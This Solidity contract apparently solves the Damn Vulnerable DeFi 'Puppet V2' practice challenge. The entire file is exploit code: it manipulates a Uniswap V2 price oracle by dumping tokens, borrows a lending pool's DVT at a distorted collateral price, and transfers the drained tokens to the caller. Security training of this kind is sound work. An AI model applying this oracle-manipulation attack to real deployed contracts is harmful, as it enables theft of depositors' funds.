// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/UniswapV2Router02.sol";

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
}

interface WETHERC20 is IERC20 {
    function deposit() external payable;
}

contract PuppetV2Attacker {
    address uniswapFactory = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;
    address uniswapPair = 0x5D70Af5E2015D0F76892F8a100D176423420B7db;
    UniswapV2Router02 uniswapRouter =
        UniswapV2Router02(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);
    IPuppetV2Pool pool =
        IPuppetV2Pool(0x0165878A594ca255338adfa4d48449f69242Eb8F);

    IERC20 token = IERC20(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    WETHERC20 weth = WETHERC20(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);

    function exploit() public {
        address[] memory path = new address[](2);

        // First, the required approvals
        token.approve(address(uniswapRouter), 1000000000 ether);
        weth.approve(address(uniswapRouter), 1000000000 ether);
        weth.approve(address(pool), 1000000000 ether);

        // Now, swap all the ether in this contract for WETH
        weth.deposit{value: address(this).balance - 1 ether}();

        // Next, swap all the DVT tokens in this contract for WETH
        path[0] = address(token);
        path[1] = address(weth);

        uniswapRouter.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp * 5
        );

        // Now, we can't borrow all 1 million DVT tokens from the pool, but
        // we can borrow 900000 of them
        pool.borrow(900000 ether);

        // Swap all the DVT tokens we just got for WETH
        uniswapRouter.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp * 5
        );

        // Borrow the remaining DVT tokens from the pool
        pool.borrow(100000 ether);

        // Swap all the remaining WETH in this contract for DVT tokens
        path[0] = address(weth);
        path[1] = address(token);

        uniswapRouter.swapExactTokensForTokens(
            weth.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp * 5
        );

        // This contract should now have over 1 million DVT tokens, transfer
        // them to the attacker
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function viewTest() public view returns (uint256) {}

    receive() external payable {}
}
